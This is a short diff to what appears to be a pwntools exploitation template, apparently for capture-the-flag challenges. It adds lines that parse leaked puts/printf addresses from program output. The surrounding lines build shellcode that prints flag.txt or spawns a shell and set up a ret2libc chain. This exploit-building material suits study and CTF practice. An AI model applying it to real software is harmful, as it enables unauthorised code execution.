@@ -133,6 +133,12 @@ asm('\n'.join([
 shellcode = asm(shellcraft.cat('flag.txt'))
 shellcode = asm(shellcraft.sh())
 # getting address
+## sample getting address
+output = io.recv().split(b'\n')
+print("output : ", output)
+leak_puts = u64(output[0].ljust(8,b"\x00")) # do this if theres no \n
+leak_printf = u64(output[1].ljust(8,b"\x00"))
+leak = u64(p.recvline().strip().ljust(8,b'\0')) # do this if theres \n at the end
 main = p64(elf.symbols.main)
 plt_puts = p64(elf.plt.puts)
 got_puts = p64(elf.got.puts)
